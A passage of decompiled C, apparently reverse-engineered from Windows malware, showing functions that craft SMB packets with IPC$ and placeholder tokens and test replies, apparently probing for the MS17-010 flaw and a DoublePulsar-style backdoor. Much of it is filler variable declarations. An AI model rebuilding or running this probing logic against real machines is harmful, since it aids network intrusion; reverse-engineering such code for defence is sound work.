    psVar6 = psVar6 + 0x1394;
    if (0x5ffd07 < (int)psVar6) {
      return;
    }
  } while( true );
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00401660(uint param_1,uint param_2) {
  DWORD dwMilliseconds;
  BOOL BVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  undefined8 uVar5;
  undefined8 uVar6;
  longlong lVar7;
  undefined4 uStack16;
  undefined4 uStack12;
  longlong local_8;
  
  uVar3 = param_1;
  uVar5 = __alldiv(param_1,param_2,1000000,0);
  uVar6 = __allrem(uVar3,param_2,1000000,0);
  uVar3 = (int)uVar6 * 1000;
  param_1 = uVar3;
  if (0 < (int)uVar5) {
    Sleep((int)uVar3 / 1000000 + (int)uVar5 * 1000);
    return;
  }
  if (_DAT_00431450 == 0.00000000) {
    BVar1 = QueryPerformanceFrequency(&local_8);
    if (BVar1 == 0) {
      Sleep((int)uVar3 / 1000000);
      return;
    }
    _DAT_00431450 = (double)local_8 * 0.00000000;
  }
  lVar7 = _ftol();
  iVar2 = (int)((ulonglong)lVar7 >> 0x20);
  dwMilliseconds = (int)uVar3 / 1000000 - 10;
  QueryPerformanceCounter((LARGE_INTEGER *)&uStack16);
  lVar7 = lVar7 + CONCAT44(uStack12,uStack16);
  iVar4 = (int)((ulonglong)lVar7 >> 0x20);
  if (0 < (int)dwMilliseconds) {
    Sleep(dwMilliseconds);
  }
  QueryPerformanceCounter((LARGE_INTEGER *)&param_1);
  if (iVar2 <= iVar4) {
    if (iVar2 < iVar4) goto LAB_0040178b;
    do {
      if ((uint)lVar7 <= param_1) {
        return;
      }
LAB_0040178b:
      do {
        QueryPerformanceCounter((LARGE_INTEGER *)&param_1);
      } while (iVar2 < iVar4);
    } while (iVar2 <= iVar4);
  }
  return;
}

int __cdecl FUN_004017b0(undefined4 param_1,undefined *param_2) {
  char cVar1;
  char *pcVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  char *pcVar7;
  uint uVar8;
  undefined4 *puVar9;
  char *pcVar10;
  undefined4 *puVar11;
  undefined local_4c8 [3];
  undefined auStack1221 [197];
  undefined4 local_400 [256];
  
  iVar3 = 0x31;
  local_4c8[0] = '\0';
  puVar9 = (undefined4 *)(local_4c8 + 1);
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    *puVar9 = 0;
    puVar9 = puVar9 + 1;
  }
  *(undefined2 *)puVar9 = 0;
  *(undefined *)((int)puVar9 + 2) = 0;
  iVar3 = 0x5f;
  sprintf(local_4c8,s____s_IPC__004312b8);
  uVar4 = 0xffffffff;
  pcVar2 = local_4c8;
  do {
    if (uVar4 == 0) break;
    uVar4 = uVar4 - 1;
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  uVar4 = ~uVar4;
  pcVar2 = FUN_00401140((char *)&DAT_0042e494,s___USERID__PLACEHOLDER___00431278,0x5f);
  if (pcVar2 != (char *)0x0) {
    pcVar7 = pcVar2 + -0x42e494;
    uVar5 = (uint)pcVar7 >> 2;
    puVar9 = &DAT_0042e494;
    puVar11 = local_400;
    while (uVar5 != 0) {
      uVar5 = uVar5 - 1;
      *puVar11 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar11 = puVar11 + 1;
    }
    uVar5 = (uint)pcVar7 & 3;
    while (uVar5 != 0) {
      uVar5 = uVar5 - 1;
      *(undefined *)puVar11 = *(undefined *)puVar9;
      puVar9 = (undefined4 *)((int)puVar9 + 1);
      puVar11 = (undefined4 *)((int)puVar11 + 1);
    }
    cVar1 = param_2[1];
    *(undefined *)((int)((int)register0x00000010 + -0x400) + (int)pcVar7) = *param_2;
    pcVar7[(int)local_400 + 1] = cVar1;
    uVar5 = 0xffffffff;
    pcVar10 = s___USERID__PLACEHOLDER___00431278;
    do {
      if (uVar5 == 0) break;
      uVar5 = uVar5 - 1;
      cVar1 = *pcVar10;
      pcVar10 = pcVar10 + 1;
    } while (cVar1 != '\0');
    uVar8 = (0x5f - (int)pcVar7) - (~uVar5 - 1);
    uVar5 = 0xffffffff;
    pcVar10 = s___USERID__PLACEHOLDER___00431278;
    do {
      if (uVar5 == 0) break;
      uVar5 = uVar5 - 1;
      cVar1 = *pcVar10;
      pcVar10 = pcVar10 + 1;
    } while (cVar1 != '\0');
    uVar6 = uVar8 >> 2;
    puVar9 = (undefined4 *)(pcVar2 + (~uVar5 - 1));
    puVar11 = (undefined4 *)(pcVar7 + (int)local_400 + 2);
    while (uVar6 != 0) {
      uVar6 = uVar6 - 1;
      *puVar11 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar11 = puVar11 + 1;
    }
    uVar8 = uVar8 & 3;
    while (uVar8 != 0) {
      uVar8 = uVar8 - 1;
      *(undefined *)puVar11 = *(undefined *)puVar9;
      puVar9 = (undefined4 *)((int)puVar9 + 1);
      puVar11 = (undefined4 *)((int)puVar11 + 1);
    }
    uVar5 = 0xffffffff;
    pcVar2 = s___USERID__PLACEHOLDER___00431278;
    do {
      if (uVar5 == 0) break;
      uVar5 = uVar5 - 1;
      cVar1 = *pcVar2;
      pcVar2 = pcVar2 + 1;
    } while (cVar1 != '\0');
    iVar3 = 0x61 - (~uVar5 - 1);
  }
  pcVar2 = FUN_00401140((char *)local_400,s___TREEPATH_REPLACE___004312a0,iVar3);
  if (pcVar2 != (char *)0x0) {
    pcVar7 = pcVar2 + -(int)local_400;
    uVar5 = (uint)pcVar7 >> 2;
    puVar9 = local_400;
    puVar11 = &DAT_0042e494;
    while (uVar5 != 0) {
      uVar5 = uVar5 - 1;
      *puVar11 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar11 = puVar11 + 1;
    }
    uVar5 = (uint)pcVar7 & 3;
    while (uVar5 != 0) {
      uVar5 = uVar5 - 1;
      *(undefined *)puVar11 = *(undefined *)puVar9;
      puVar9 = (undefined4 *)((int)puVar9 + 1);
      puVar11 = (undefined4 *)((int)puVar11 + 1);
    }
    uVar5 = uVar4 >> 2;
    puVar9 = (undefined4 *)local_4c8;
    puVar11 = (undefined4 *)(pcVar7 + 0x42e494);
    while (uVar5 != 0) {
      uVar5 = uVar5 - 1;
      *puVar11 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar11 = puVar11 + 1;
    }
    uVar5 = uVar4 & 3;
    while (uVar5 != 0) {
      uVar5 = uVar5 - 1;
      *(undefined *)puVar11 = *(undefined *)puVar9;
      puVar9 = (undefined4 *)((int)puVar9 + 1);
      puVar11 = (undefined4 *)((int)puVar11 + 1);
    }
    uVar5 = 0xffffffff;
    pcVar10 = s___TREEPATH_REPLACE___004312a0;
    do {
      if (uVar5 == 0) break;
      uVar5 = uVar5 - 1;
      cVar1 = *pcVar10;
      pcVar10 = pcVar10 + 1;
    } while (cVar1 != '\0');
    uVar8 = (iVar3 - (int)pcVar7) - (~uVar5 - 1);
    uVar5 = 0xffffffff;
    pcVar10 = s___TREEPATH_REPLACE___004312a0;
    do {
      if (uVar5 == 0) break;
      uVar5 = uVar5 - 1;
      cVar1 = *pcVar10;
      pcVar10 = pcVar10 + 1;
    } while (cVar1 != '\0');
    uVar6 = uVar8 >> 2;
    puVar9 = (undefined4 *)(pcVar2 + (~uVar5 - 1));
    puVar11 = (undefined4 *)(pcVar7 + (int)&DAT_0042e494 + uVar4);
    while (uVar6 != 0) {
      uVar6 = uVar6 - 1;
      *puVar11 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar11 = puVar11 + 1;
    }
    uVar8 = uVar8 & 3;
    while (uVar8 != 0) {
      uVar8 = uVar8 - 1;
      *(undefined *)puVar11 = *(undefined *)puVar9;
      puVar9 = (undefined4 *)((int)puVar9 + 1);
      puVar11 = (undefined4 *)((int)puVar11 + 1);
    }
    uVar5 = 0xffffffff;
    pcVar2 = s___TREEPATH_REPLACE___004312a0;
    do {
      if (uVar5 == 0) break;
      uVar5 = uVar5 - 1;
      cVar1 = *pcVar2;
      pcVar2 = pcVar2 + 1;
    } while (cVar1 != '\0');
    iVar3 = iVar3 + (uVar4 - (~uVar5 - 1));
  }
  DAT_0042e494._3_1_ = (char)iVar3 + -4;
  return iVar3;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 __cdecl FUN_00401980(undefined4 param_1) {
  undefined2 uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  undefined2 unaff_SI;
  undefined4 *puVar5;
  undefined4 uVar6;
  undefined4 uStack1072;
  undefined4 uStack1068;
  undefined4 uStack1064;
  undefined4 uStack1060;
  undefined4 uStack1056;
  undefined4 uVar7;
  char cStack1044;
  undefined4 local_410;
  undefined uStack1028;
  undefined uStack1027;
  undefined local_400;
  undefined4 local_3ff;
  
  iVar4 = 0xff;
  local_400 = 0;
  puVar5 = (undefined4 *)&local_3ff;
  while (iVar4 != 0) {
    iVar4 = iVar4 + -1;
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  *(undefined *)((int)puVar5 + 2) = 0;
  local_410 = CONCAT22(local_410._2_2_,2);
  uStack1056 = param_1;
  uStack1060 = 0x4019b1;
  local_410 = Ordinal_11();
  uStack1060 = param_1;
  uStack1064 = 0x4019c2;
  uVar1 = Ordinal_9();
  uStack1064 = 0;
  uStack1068 = 1;
  uStack1072 = 2;
  uVar7 = CONCAT22(uVar1,unaff_SI);
  iVar4 = Ordinal_23();
  if (iVar4 != -1) {
    puVar5 = &uStack1060;
    uVar1 = 0x10;
    iVar3 = iVar4;
    iVar2 = Ordinal_4(iVar4,puVar5,0x10);
    if (iVar2 != -1) {
      iVar2 = Ordinal_19(iVar4,&DAT_0042e3d0,0x58,0);
      if (iVar2 != -1) {
        iVar2 = Ordinal_16(iVar4,&uStack1056,0x400,0);
        if (iVar2 != -1) {
          iVar2 = Ordinal_19(iVar4,&DAT_0042e42c,0x67,0);
          if (iVar2 != -1) {
            iVar2 = Ordinal_16(iVar4,&uStack1056,0x400,0);
            if (iVar2 != -1) {
              uVar6 = CONCAT13((undefined)local_3ff,CONCAT12(local_400,uVar1));
              iVar2 = FUN_004017b0(param_1,&stack0xfffffbce);
              uVar1 = (undefined2)uVar6;
              iVar2 = Ordinal_19(iVar4,&DAT_0042e494,iVar2,0,iVar3,puVar5,uVar6);
              if (iVar2 != -1) {
                iVar2 = Ordinal_16(iVar4,&uStack1056,0x400,0);
                if (iVar2 != -1) {
                  DAT_0042e510 = uStack1028;
                  DAT_0042e512 = uStack1028;
                  DAT_0042e514 = local_400;
                  DAT_0042e515 = (undefined)local_3ff;
                  DAT_0042e511 = uStack1027;
                  DAT_0042e513 = uStack1027;
                  DAT_0042e516 = local_3ff._1_1_;
                  DAT_0042e517 = local_3ff._2_1_;
                  iVar3 = Ordinal_19(iVar4,&DAT_0042e4f4,0x4e,0,iVar3,puVar5,
                                     CONCAT13((undefined)local_3ff,CONCAT12(local_400,uVar1)));
                  if (iVar3 != -1) {
                    iVar3 = Ordinal_16(iVar4,&uStack1056,0x400,0);
                    if ((((iVar3 != -1) && ((char)((uint)uVar7 >> 8) == '\x05')) &&
                        ((char)((uint)uVar7 >> 0x10) == '\x02')) &&
                       (((char)((uint)uVar7 >> 0x18) == '\0' && (cStack1044 == -0x40)))) {
                      Ordinal_3(iVar4);
                      return 1;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    Ordinal_3(iVar4);
  }
  return 0;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 __cdecl FUN_00401b70(undefined4 param_1,undefined4 param_2) {
  undefined uVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 uStack1060;
  undefined4 local_410;
  undefined uStack1028;
  undefined uStack1027;
  undefined local_400;
  undefined4 local_3ff;
  int iStack24;
  
  iVar3 = 0xff;
  local_400 = 0;
  local_410 = CONCAT22(local_410._2_2_,2);
  puVar4 = (undefined4 *)&local_3ff;
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  *(undefined *)((int)puVar4 + 2) = 0;
  uStack1060 = param_1;
  local_410 = Ordinal_11();
  Ordinal_9(param_2);
  iVar3 = Ordinal_23(2,1,0);
  if (iVar3 != -1) {
    iVar2 = Ordinal_4(iVar3,&uStack1060,0x10);
    if (iVar2 != -1) {
      iVar2 = Ordinal_19(iVar3,&DAT_0042e544,0x89,0);
      if (iVar2 != -1) {
        iVar2 = Ordinal_16(iVar3,&stack0xfffffbe0,0x400,0);
        if (iVar2 != -1) {
          iVar2 = Ordinal_19(iVar3,&DAT_0042e5d0,0x8c,0);
          if (iVar2 != -1) {
            iVar2 = Ordinal_16(iVar3,&stack0xfffffbe0,0x400,0);
            uVar1 = local_400;
            if (iVar2 != -1) {
              DAT_0042e67c = local_400;
              DAT_0042e67d = (undefined)local_3ff;
              iVar2 = Ordinal_19(iVar3,&DAT_0042e65c,0x60,0);
              if (iVar2 != -1) {
                iVar2 = Ordinal_16(iVar3,&stack0xfffffbe0,0x400,0);
                if (iVar2 != -1) {
                  DAT_0042e6d8 = uStack1028;
                  DAT_0042e6d9 = uStack1027;
                  DAT_0042e6dc = uVar1;
                  DAT_0042e6dd = (undefined)local_3ff;
                  iVar2 = Ordinal_19(iVar3,&DAT_0042e6bc,0x52,0);
                  if (iVar2 != -1) {
                    iVar2 = Ordinal_16(iVar3,&stack0xfffffbe0,0x400,0);
                    if ((iVar2 != -1) && (local_3ff._1_1_ == 'Q')) {
                      if (iStack24 != 0) {
LAB_00401d4d:
                        Ordinal_3(iVar3);
                        return 1;
                      }
                      DAT_0042e6de = 0x42;
                      DAT_0042e6ed = 0xe;
                      DAT_0042e6ee = 0x69;
                      DAT_0042e6ef = 0;
                      DAT_0042e6f0 = 0;
                      iVar2 = Ordinal_19(iVar3,&DAT_0042e6bc,0x52,0);
                      if (iVar2 != -1) {
                        iVar2 = Ordinal_16(iVar3,&stack0xfffffbe0,0x400,0);
                        if (iVar2 != -1) goto LAB_00401d4d;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    Ordinal_3(iVar3);
  }
  return 0;
}

// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00401d80(void) {
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 local_594;
  undefined local_590;
  undefined local_58f;
  undefined local_58e;
  undefined local_58d;
  undefined local_58c;
  undefined local_58b;
  undefined local_58a;
  undefined local_589;
  undefined local_588;
  undefined local_587;
  undefined local_586;
  undefined local_585;
  undefined local_584;
  undefined local_583;
  undefined local_582;
  undefined local_581;
  undefined local_580;
  undefined local_57f;
  undefined local_57e;
  undefined local_57d;
  undefined local_57c;
  undefined local_57b;
  undefined local_57a;
  undefined local_579;
  undefined local_578;
  undefined local_577;
  undefined local_576;
  undefined local_575;
  undefined local_574;
  undefined local_573;
  undefined local_572;
  undefined local_571;
  undefined local_570;
  undefined local_56f;
  undefined local_56e;
  undefined local_56d;
  undefined local_56c;
  undefined local_56b;
  undefined local_56a;
  undefined local_569;
  undefined local_568;
  undefined local_567;
  undefined local_566;
  undefined local_565;
  undefined local_564;
  undefined local_563;
  undefined local_562;
  undefined local_561;
  undefined local_560;
  undefined local_55f;
  undefined local_55e;
  undefined local_55d;
  undefined local_55c;
  undefined local_55b;
  undefined local_55a;
  undefined local_559;
  undefined local_558;
  undefined local_557;
  undefined local_556;
  undefined local_555;
  undefined local_554;
  undefined local_553;
  undefined local_552;
  undefined local_551;
  undefined local_550;
  undefined local_54f;
  undefined local_54e;
  undefined local_54d;
  undefined local_54c;
  undefined local_54b;
  undefined local_54a;
  undefined local_549;
  undefined local_548;
  undefined local_547;
  undefined local_546;
  undefined local_545;
  undefined local_544;
  undefined local_543;
  undefined local_542;
  undefined local_541;
  undefined local_540;
  undefined local_53f;
  undefined local_53e;
  undefined local_53d;
  undefined local_53c;
  undefined local_53b;
  undefined local_53a;
  undefined local_539;
  undefined local_538;
  undefined local_537;
  undefined local_536;
  undefined local_535;
  undefined local_534;
  undefined local_533;
  undefined local_532;
  undefined local_531;
  undefined local_530;
  undefined local_52f;
  undefined local_52e;
  undefined local_52d;
  undefined local_52c;
  undefined local_52b;
  undefined local_52a;
  undefined local_529;
  undefined local_528;
  undefined local_527;
  undefined local_526;
  undefined local_525;
  undefined local_524;
  undefined local_523;
  undefined local_522;
  undefined local_521;
  undefined local_520;
  undefined local_51f;
  undefined local_51e;
  undefined local_51d;
  undefined local_51c;
  undefined local_51b;
  undefined local_51a;
  undefined local_519;
  undefined local_518;
  undefined local_517;
  undefined local_516;
  undefined local_515;
  undefined local_514;
  undefined local_513;
  undefined local_512;
  undefined local_511;
  undefined local_510;
  undefined local_50f;
  undefined local_50e;
  undefined local_50d;
  undefined local_50c;
  undefined local_50b;
  undefined local_50a;
  undefined local_509;
  undefined local_508;
  undefined local_507;
  undefined local_506;
  undefined local_505;
  undefined local_504;
  undefined local_503;
  undefined local_502;
  undefined local_501;
  undefined local_500;
  undefined local_4ff;
  undefined local_4fe;
  undefined local_4fd;
  undefined local_4fc;
  undefined local_4fb;
  undefined local_4fa;
  undefined local_4f9;
  undefined local_4f8;
  undefined local_4f7;
  undefined local_4f6;
  undefined local_4f5;
  undefined local_4f4;
  undefined local_4f3;
  undefined local_4f2;
  undefined local_4f1;
  undefined local_4f0;
  undefined local_4ef;
  undefined local_4ee;
  undefined local_4ed;
  undefined local_4ec;
  undefined local_4eb;
  undefined local_4ea;
  undefined local_4e9;
  undefined local_4e8;
  undefined local_4e7;
  undefined local_4e6;
  undefined local_4e5;
  undefined local_4e4;
  undefined local_4e3;
  undefined local_4e2;
  undefined local_4e1;
  undefined local_4e0;
  undefined local_4df;
  undefined local_4de;
  undefined local_4dd;
  undefined local_4dc;
  undefined local_4db;
  undefined local_4da;
  undefined local_4d9;
  undefined local_4d8;
  undefined local_4d7;
  undefined local_4d6;
  undefined local_4d5;
  undefined local_4d4;
  undefined local_4d3;
  undefined local_4d2;
  undefined local_4d1;
  undefined local_4d0;
  undefined local_4cf;
  undefined local_4ce;
  undefined local_4cd;
  undefined local_4cc;
  undefined local_4cb;
  undefined local_4ca;
  undefined local_4c9;
  undefined local_4c8;
  undefined local_4c7;
  undefined local_4c6;
  undefined local_4c5;
  undefined local_4c4;
  undefined local_4c3;
  undefined local_4c2;
  undefined local_4c1;
  undefined local_4c0;
  undefined local_4bf;
  undefined local_4be;
  undefined local_4bd;
  undefined local_4bc;
  undefined local_4bb;
  undefined local_4ba;
  undefined local_4b9;
  undefined local_4b8;
  undefined local_4b7;
  undefined local_4b6;
  undefined local_4b5;
  undefined local_4b4;
  undefined local_4b3;
  undefined local_4b2;
  undefined local_4b1;
  undefined local_4b0;
  undefined local_4af;
  undefined local_4ae;
  undefined local_4ad;
  undefined local_4ac;
  undefined local_4ab;
  undefined local_4aa;
  undefined local_4a9;
  undefined local_4a8;
  undefined local_4a7;
  undefined local_4a6;
  undefined local_4a5;
  undefined local_4a4;
  undefined local_4a3;
  undefined local_4a2;
  undefined local_4a1;
  undefined local_4a0;
  undefined local_49f;
  undefined local_49e;
  undefined local_49d;
  undefined local_49c;
  undefined local_49b;
  undefined local_49a;
  undefined local_499;
  undefined local_498;
  undefined local_497;
  undefined local_496;
  undefined local_495;
  undefined local_494;
  undefined local_493;
  undefined local_492;
  undefined local_491;
  undefined local_490;
  undefined local_48f;
  undefined local_48e;
  undefined local_48d;
  undefined local_48c;
  undefined local_48b;
  undefined local_48a;
  undefined local_489;
  undefined local_488;
  undefined local_487;
  undefined local_486;
  undefined local_485;
  undefined local_484;
  undefined local_483;
  undefined local_482;
  undefined local_481;
  undefined local_480;
  undefined local_47f;
  undefined local_47e;
  undefined local_47d;
  undefined local_47c;
  undefined local_47b;
  undefined local_47a;
  undefined local_479;
  undefined local_478;
  undefined local_477;
  undefined local_476;
  undefined local_475;
  undefined local_474;
  undefined local_473;
  undefined local_472;
  undefined local_471;
  undefined local_470;
  undefined local_46f;
  undefined local_46e;
  undefined local_46d;
  undefined local_46c;
  undefined local_46b;
  undefined local_46a;
  undefined local_469;
  undefined local_468;
  undefined local_467;
  undefined local_466;
  undefined local_465;
  undefined local_464;
  undefined local_463;
  undefined local_462;
  undefined local_461;
  undefined local_460;
  undefined local_45f;
  undefined local_45e;
  undefined local_45d;
  undefined local_45c;
  undefined local_45b;
  undefined local_45a;
  undefined local_459;
  undefined local_458;
  undefined local_457;
  undefined local_456;
  undefined local_455;
  undefined local_454;
  undefined local_453;
  undefined local_452;
  undefined local_451;
  undefined local_450;
  undefined local_44f;
  undefined local_44e;
  undefined local_44d;
  undefined local_44c;
  undefined local_44b;
  undefined local_44a;
  undefined local_449;
  undefined local_448;
  undefined local_447;
  undefined local_446;
  undefined local_445;
  undefined local_444;
  undefined local_443;
  undefined local_442;
  undefined local_441;
  undefined local_440;
  undefined local_43f;
  undefined local_43e;
  undefined local_43d;
  undefined local_43c;
  undefined local_43b;
  undefined local_43a;
  undefined local_439;
  undefined local_438;
  undefined local_437;
  undefined local_436;
  undefined local_435;
  undefined local_434;
  undefined local_433;
  undefined local_432;
  undefined local_431;
  undefined local_430;
  undefined local_42f;
  undefined local_42e;
  undefined local_42d;
  undefined local_42c;
  undefined local_42b;
  undefined local_42a;
  undefined local_429;
  undefined local_428;
  undefined local_427;
  undefined local_426;
  undefined local_425;
  undefined local_424;
  undefined local_423;
  undefined local_422;
  undefined local_421;
  undefined local_420;
  undefined local_41f;
  undefined local_41e;
  undefined local_41d;
  undefined local_41c;
  undefined local_41b;
  undefined local_41a;
  undefined local_419;
  undefined local_418;
  undefined local_417;
  undefined local_416;
  undefined local_415;
  undefined local_414;
  undefined local_413;
  undefined local_412;
  undefined local_411;
  undefined local_410;
  undefined local_40f;
  undefined local_40e;
  undefined local_40d;
  undefined local_40c;
  undefined local_40b;
  undefined local_40a;
  undefined local_409;
  undefined local_408;
  undefined local_407;
  undefined local_406;
  undefined local_405;
  undefined local_404;
  undefined local_403;
  undefined local_402;
  undefined local_401;
  undefined local_400;
  undefined local_3ff;
  undefined local_3fe;
  undefined local_3fd;
  undefined local_3fc;
  undefined local_3fb;
  undefined local_3fa;
  undefined local_3f9;
  undefined local_3f8;
  undefined local_3f7;
  undefined local_3f6;
  undefined local_3f5;
  undefined local_3f4;
  undefined local_3f3;
  undefined local_3f2;
  undefined local_3f1;
  undefined local_3f0;
  undefined local_3ef;
  undefined local_3ee;
  undefined local_3ed;
  undefined local_3ec;
  undefined local_3eb;
  undefined local_3ea;
  undefined local_3e9;
  undefined local_3e8;
  undefined local_3e7;
  undefined local_3e6;
  undefined local_3e5;
  undefined local_3e4;
  undefined local_3e3;
  undefined local_3e2;
  undefined local_3e1;
  undefined local_3e0;
  undefined local_3df;
  undefined local_3de;
  undefined local_3dd;
  undefined local_3dc;
  undefined local_3db;
  undefined local_3da;
  undefined local_3d9;
  undefined local_3d8;
  undefined local_3d7;
  undefined local_3d6;
  undefined local_3d5;
  undefined local_3d4;
  undefined local_3d3;
  undefined local_3d2;
  undefined local_3d1;
  undefined local_3d0;
  undefined local_3cf;
  undefined local_3ce;
  undefined local_3cd;
  undefined local_3cc;
  undefined local_3cb;
  undefined local_3ca;
  undefined local_3c9;
  undefined local_3c8;
  undefined local_3c7;
  undefined local_3c6;
  undefined local_3c5;
  undefined local_3c4;
  undefined local_3c3;
  undefined local_3c2;
  undefined local_3c1;
  undefined local_3c0;
  undefined local_3bf;
  undefined local_3be;
  undefined local_3bd;
  undefined local_3bc;
  undefined local_3bb;
  undefined local_3ba;
  undefined local_3b9;
  undefined local_3b8;
  undefined local_3b7;
  undefined local_3b6;
  undefined local_3b5;
  undefined local_3b4;
  undefined local_3b3;
  undefined local_3b2;
  undefined local_3b1;
  undefined local_3b0;
  undefined local_3af;
  undefined local_3ae;
  undefined local_3ad;
  undefined local_3ac;
  undefined local_3ab;
  undefined local_3aa;
  undefined local_3a9;
  undefined local_3a8;
  undefined local_3a7;
  undefined local_3a6;
  undefined local_3a5;
  undefined local_3a4;
  undefined local_3a3;
  undefined local_3a2;
  undefined local_3a1;
  undefined local_3a0;
  undefined local_39f;
  undefined local_39e;
  undefined local_39d;
  undefined local_39c;
  undefined local_39b;
  undefined local_39a;
  undefined local_399;
  undefined local_398;
  undefined local_397;
  undefined local_396;
  undefined local_395;
  undefined local_394;
  undefined local_393;
  undefined local_392;
  undefined local_391;
  undefined local_390;
  undefined local_38f;
  undefined local_38e;
  undefined local_38d;
  undefined local_38c;
  undefined local_38b;
  undefined local_38a;
  undefined local_389;
  undefined local_388;
  undefined local_387;
  undefined local_386;
  undefined local_385;
  undefined local_384;
  undefined local_383;
  undefined local_382;
  undefined local_381;
  undefined local_380;
  undefined local_37f;
  undefined local_37e;
  undefined local_37d;
  undefined local_37c;
  undefined local_37b;
  undefined local_37a;
  undefined local_379;
  undefined local_378;
  undefined local_377;
  undefined local_376;
  undefined local_375;
  undefined local_374;
  undefined local_373;
  undefined local_372;
  undefined local_371;
  undefined local_370;
  undefined local_36f;
  undefined local_36e;
  undefined local_36d;
  undefined local_36c;
  undefined local_36b;
  undefined local_36a;
  undefined local_369;
  undefined local_368;
  undefined local_367;
  undefined local_366;
  undefined local_365;
  undefined local_364;
  undefined local_363;
  undefined local_362;
  undefined local_361;
  undefined local_360;
  undefined local_35f;
  undefined local_35e;
  undefined local_35d;
  undefined local_35c;
  undefined local_35b;
  undefined local_35a;
  undefined local_359;
  undefined local_358;
  undefined local_357;
  undefined local_356;
  undefined local_355;
  undefined local_354;
  undefined local_353;
  undefined local_352;
  undefined local_351;
  undefined local_350;
  undefined local_34f;
  undefined local_34e;
  undefined local_34d;
  undefined local_34c;
  undefined local_34b;
  undefined local_34a;
  undefined local_349;
  undefined local_348;
  undefined local_347;
  undefined local_346;
  undefined local_345;
  undefined local_344;
  undefined local_343;
  undefined local_342;
  undefined local_341;
  undefined local_340;
  undefined local_33f;
  undefined local_33e;
  undefined local_33d;
  undefined local_33c;
  undefined local_33b;
  undefined local_33a;
  undefined local_339;
  undefined local_338;
  undefined local_337;
  undefined local_336;
  undefined local_335;
  undefined local_334;
  undefined local_333;
  undefined local_332;
  undefined local_331;
  undefined local_330;
  undefined local_32f;
  undefined local_32e;
  undefined local_32d;
  undefined local_32c;
  undefined local_32b;
  undefined local_32a;
  undefined local_329;
  undefined local_328;
  undefined local_327;
  undefined local_326;
  undefined local_325;
  undefined local_324;
  undefined local_323;
  undefined local_322;
  undefined local_321;
  undefined local_320;
  undefined local_31f;
  undefined local_31e;
  undefined local_31d;
  undefined local_31c;
  undefined local_31b;
  undefined local_31a;
  undefined local_319;
  undefined local_318;
  undefined local_317;
  undefined local_316;
  undefined local_315;
  undefined local_314;
  undefined local_313;
  undefined local_312;
  undefined local_311;
  undefined local_310;
  undefined local_30f;
  undefined local_30e;
  undefined local_30d;
  undefined local_30c;
  undefined local_30b;
  undefined local_30a;
  undefined local_309;
  undefined local_308;
  undefined local_307;
  undefined local_306;
  undefined local_305;
  undefined local_304;
  undefined local_303;
  undefined local_302;
  undefined local_301;
  undefined local_300;
  undefined local_2ff;
  undefined local_2fe;
  undefined local_2fd;
  undefined local_2fc;
  undefined local_2fb;
  undefined local_2fa;
  undefined local_2f9;
  undefined local_2f8;
  undefined local_2f7;
  undefined local_2f6;
  undefined local_2f5;
  undefined local_2f4;
  undefined local_2f3;
  undefined local_2f2;
  undefined local_2f1;
  undefined local_2f0;
  undefined local_2ef;
  undefined local_2ee;
  undefined local_2ed;
  undefined local_2ec;
  undefined local_2eb;
  undefined local_2ea;
  undefined local_2e9;
  undefined local_2e8;
  undefined local_2e7;
  undefined local_2e6;
  undefined local_2e5;
  undefined local_2e4;
  undefined local_2e3;
  undefined local_2e2;
  undefined local_2e1;
  undefined local_2e0;
  undefined local_2df;
  undefined local_2de;
  undefined local_2dd;
  undefined local_2dc;
  undefined local_2db;
  undefined local_2da;
  undefined local_2d9;
  undefined local_2d8;
  undefined local_2d7;
  undefined local_2d6;
  undefined local_2d5;
  undefined local_2d4;
  undefined local_2d3;
  undefined local_2d2;
  undefined local_2d1;
  undefined local_2d0;
  undefined local_2cf;
  undefined local_2ce;
  undefined local_2cd;
  undefined local_2cc;
  undefined local_2cb;
  undefined local_2ca;
  undefined local_2c9;
  undefined local_2c8;
  undefined local_2c7;
  undefined local_2c6;
  undefined local_2c5;
  undefined local_2c4;
  undefined local_2c3;
  undefined local_2c2;
  undefined local_2c1;
  undefined local_2c0;
  undefined local_2bf;
  undefined local_2be;
  undefined local_2bd;
  undefined local_2bc;
  undefined local_2bb;
  undefined local_2ba;
  undefined local_2b9;
  undefined local_2b8;
  undefined local_2b7;
  undefined local_2b6;
  undefined local_2b5;
  undefined local_2b4;
  undefined local_2b3;
  undefined local_2b2;
  undefined local_2b1;
  undefined local_2b0;
  undefined local_2af;
  undefined local_2ae;
  undefined local_2ad;
  undefined local_2ac;
  undefined local_2ab;
  undefined local_2aa;
  undefined local_2a9;
  undefined local_2a8;
  undefined local_2a7;
  undefined local_2a6;
  undefined local_2a5;
  undefined local_2a4;
  undefined local_2a3;
  undefined local_2a2;
  undefined local_2a1;
  undefined local_2a0;
  undefined local_29f;
  undefined local_29e;
  undefined local_29d;
  undefined local_29c;
  undefined local_29b;
  undefined local_29a;
  undefined local_299;
  undefined local_298;
  undefined local_297;
  undefined local_296;
  undefined local_295;
  undefined local_294;
  undefined local_293;
  undefined local_292;
  undefined local_291;
  undefined local_290;
  undefined local_28f;
  undefined local_28e;
  undefined local_28d;
  undefined local_28c;
  undefined local_28b;
  undefined local_28a;
  undefined local_289;
  undefined local_288;
  undefined local_287;
  undefined local_286;
  undefined local_285;
